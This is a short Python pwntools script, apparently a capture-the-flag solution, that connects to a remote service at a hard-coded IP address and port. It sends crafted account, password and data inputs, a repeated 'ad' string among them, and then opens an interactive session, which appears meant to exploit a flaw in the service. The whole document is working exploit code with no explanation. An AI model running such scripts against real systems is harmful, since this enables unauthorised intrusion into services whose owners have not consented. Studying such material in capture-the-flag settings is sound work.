from pwn import *

io=remote('139.180.215.222', 20000)

io.sendafter('account:','aaaaaaaaaaaaaaaa')
io.sendafter('password:','!!!!!!!!!!!!!!!!')
io.sendafter('data:','ad'*28)

io.interactive()